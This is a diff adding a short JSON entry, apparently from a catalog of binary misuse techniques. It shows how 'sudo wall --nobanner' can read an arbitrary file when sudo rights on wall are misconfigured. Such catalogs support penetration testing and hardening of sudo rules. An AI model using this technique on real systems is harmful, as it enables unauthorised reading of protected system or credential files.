@@ -1,0 +1,10 @@
+{
+  "functions": {
+    "sudo": [
+      {
+        
+        "code": "LFILE=file_to_read\nsudo wall --nobanner \"$LFILE\"\n"
+      }
+    ]
+  }
+}
